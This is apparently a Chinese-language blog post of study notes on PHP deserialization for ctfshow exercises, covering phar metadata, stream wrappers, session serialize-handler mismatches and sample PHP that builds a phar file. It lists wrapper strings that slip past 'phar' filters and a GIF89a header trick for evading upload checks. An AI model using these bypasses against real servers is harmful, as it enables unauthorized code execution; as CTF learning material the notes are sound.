<p>来自：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/av414266940/">https://www.bilibili.com/video/av414266940/</a></p>
<h2 id="PHP原生类反序列化利用（暂无）"><a href="#PHP原生类反序列化利用（暂无）" class="headerlink" title="PHP原生类反序列化利用（暂无）"></a>PHP原生类反序列化利用（暂无）</h2><h2 id="Phar反序列化"><a href="#Phar反序列化" class="headerlink" title="Phar反序列化"></a>Phar反序列化</h2><p><strong>ctfshow 276</strong></p>
<p>phar文件本质上是一种压缩文件，会以序列化的形式存储用户自定义的meta-data。当受影响的文件操作函数调用phar文件时，会自动反序列化meta-data内的内容。</p>
<h3 id="什么是phar文件"><a href="#什么是phar文件" class="headerlink" title="什么是phar文件"></a>什么是phar文件</h3><p>在软件中，PHAR（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发</p>
<p>php通过用户定义和内置的“流包装器”实现复杂的文件处理功能。内置包装器可用于文件系统函数，如(fopen(),copy(),file_exists()和filesize()。 phar:&#x2F;&#x2F;就是一种内置的流包装器。</p>
<p>php中一些常见的流包装器如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:// — 访问本地文件系统，在用文件系统函数时默认就使用该包装器</span><br><span class="line">http:// — 访问 HTTP(s) 网址</span><br><span class="line">ftp:// — 访问 FTP(s) URLs</span><br><span class="line">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">zlib:// — 压缩流</span><br><span class="line">data:// — 数据（RFC 2397）</span><br><span class="line">glob:// — 查找匹配的文件路径模式</span><br><span class="line">phar:// — PHP 归档</span><br><span class="line">ssh2:// — Secure Shell 2</span><br><span class="line">rar:// — RAR</span><br><span class="line">ogg:// — 音频流</span><br><span class="line">expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure>

<h3 id="phar文件的结构"><a href="#phar文件的结构" class="headerlink" title="phar文件的结构"></a>phar文件的结构</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">stub:phar文件的标志，必须以 xxx __HALT_COMPILER();?&gt; 结尾，否则无法识别。xxx可以为自定义内容。</span><br><span class="line">manifest:phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是漏洞利用最核心的地方。</span><br><span class="line">content:被压缩文件的内容</span><br><span class="line">signature (可空):签名，放在末尾。</span><br></pre></td></tr></table></figure>

<p>下面生成一个phar文件</p>
<p>前提：开启php.ini中的 <strong>phar.readonly &#x3D; off</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h3><ol>
<li>phar文件要能够上传到服务器端。</li>
<li>要有可用的魔术方法作为“跳板”。</li>
<li>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤。</li>
</ol>
<h3 id="受影响的函数"><a href="#受影响的函数" class="headerlink" title="受影响的函数"></a>受影响的函数</h3><p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021449095.png"></p>
<p><a target="_blank" rel="noopener" href="https://blog.zsxsoft.com/post/38">https://blog.zsxsoft.com/post/38</a></p>
<h3 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h3><p>当环境限制了phar不能出现在前面的字符里。可以使用<code>compress.bzip2://</code>和<code>compress.zlib://</code>等绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">compress.bzip://phar:///test.phar/test.txt</span><br><span class="line">compress.bzip2://phar:///test.phar/test.txt</span><br><span class="line">compress.zlib://phar:///home/sx/test.phar/test.txt</span><br><span class="line">php://filter/resource=phar:///test.phar/test.txt</span><br></pre></td></tr></table></figure>

<p>当环境限制了phar不能出现在前面的字符里，还可以配合其他协议进行利用。 php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;phar:&#x2F;&#x2F;phar.phar</p>
<p>GIF格式验证可以通过在文件头部添加GIF89a绕过 1、$phar-&gt;setStub(“GIF89a”.”<?php __HALT_COMPILER(); ?>“); &#x2F;&#x2F;设置stub 2、生成一个phar.phar，修改后缀名为phar.gif</p>
<h2 id="php-session反序列化"><a href="#php-session反序列化" class="headerlink" title="php-session反序列化"></a>php-session反序列化</h2><h3 id="session简单介绍"><a href="#session简单介绍" class="headerlink" title="session简单介绍"></a>session简单介绍</h3><p>在计算机中，尤其是在网络应用中，称为“会话控制”。Session 对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的 Web 页之间跳转时，存储在 Session 对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。当用户请求来自应用程序的 Web 页时，如果该用户还没有会话，则 Web 服务器将自动创建一个 Session 对象。当会话过期或被放弃后，服务器将终止该会话。</p>
<p>当第一次访问网站时，**seesion_start()**函数就会创建一个唯一的Session ID，并自动通过HTTP的响应头，将这个Session ID保存到客户端Cookie中。同时，也在服务器端创建一个以Session ID命名的文件，用于保存这个用户的会话信息。当同一个用户再次访问这个网站时，也会自动通过HTTP的请求头将Cookie中保存的Seesion ID再携带过来，这时Session_start()函数就不会再去分配一个新的Session ID，而是在服务器的硬盘中去寻找和这个Session ID同名的Session文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的。</p>
<h3 id="session-的存储机制"><a href="#session-的存储机制" class="headerlink" title="session 的存储机制"></a>session 的存储机制</h3><p>php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项session.save_handler来进行确定的，默认是以文件的方式存储。 存储的文件是以sess_sessionid来进行命名的</p>
<p>session_start();运行之后开启session并且产生一个唯一的32位的session_id</p>
<h3 id="利用姿势"><a href="#利用姿势" class="headerlink" title="利用姿势"></a>利用姿势</h3><h4 id="session-upload-progress进行文件包含和反序列化渗透"><a href="#session-upload-progress进行文件包含和反序列化渗透" class="headerlink" title="session.upload_progress进行文件包含和反序列化渗透"></a>session.upload_progress进行文件包含和反序列化渗透</h4><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/202819.html">https://www.freebuf.com/vuls/202819.html</a></p>
<h4 id="使用不同的引擎来处理session文件"><a href="#使用不同的引擎来处理session文件" class="headerlink" title="使用不同的引擎来处理session文件"></a>使用不同的引擎来处理session文件</h4><p>$_SESSION变量直接可控</p>
<p>php引擎的存储格式是<code>键名|serialized_string</code>，而php_serialize引擎的存储格式是<code>serialized_string</code>。如果程序使用两个引擎来分别处理的话就会出现问题</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;aaa&#x27;</span>] = <span class="string">&#x27;bbb&#x27;</span>;</span><br><span class="line"><span class="comment">//aaa|s:3:&quot;bbb&quot;;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;aaa&#x27;</span>] = <span class="string">&#x27;bbb&#x27;</span>;</span><br><span class="line"><span class="comment">//a:1:&#123;s:3:&quot;aaa&quot;;s:3:&quot;bbb&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<p><strong>ctfshow web263</strong></p>
<p>python反序列化</p>
<p>ctfshow277，278</p>
<p>参考：<a target="_blank" rel="noopener" href="https://y4tacker.blog.csdn.net/article/details/113588692">https://y4tacker.blog.csdn.net/article/details/113588692</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://cjb12.github.io/project/2022/04/13/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" data-id="cln8f3hz70000vwtg1lmodtfa" data-title="php反序列化" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  


</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/project/archives/2023/04/">April 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/project/archives/2023/03/">March 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/project/archives/2023/01/">January 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/project/archives/2022/07/">July 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/project/archives/2022/04/">April 2022</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/project/2023/04/16/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%88Windows%E7%AF%87%EF%BC%89/">内网渗透之权限提升（Windows篇）</a>
          </li>
        
          <li>
            <a href="/project/2023/04/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%88Linux%E7%AF%87%EF%BC%89/">内网渗透之权限提升（Linux篇）</a>
          </li>
        
          <li>
            <a href="/project/2023/04/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">内网渗透之权限维持</a>
          </li>
        
          <li>
            <a href="/project/2023/04/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">内网渗透之信息收集</a>
          </li>
        
          <li>
            <a href="/project/2023/03/06/MySQL%E5%86%99Shell/">MySQL写Shell</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2023 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/project/" class="mobile-nav-link">Home</a>
  
    <a href="/project/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/project/js/jquery-3.6.4.min.js"></script>



  
<script src="/project/fancybox/jquery.fancybox.min.js"></script>




<script src="/project/js/script.js"></script>





  </div>
</body>
</html>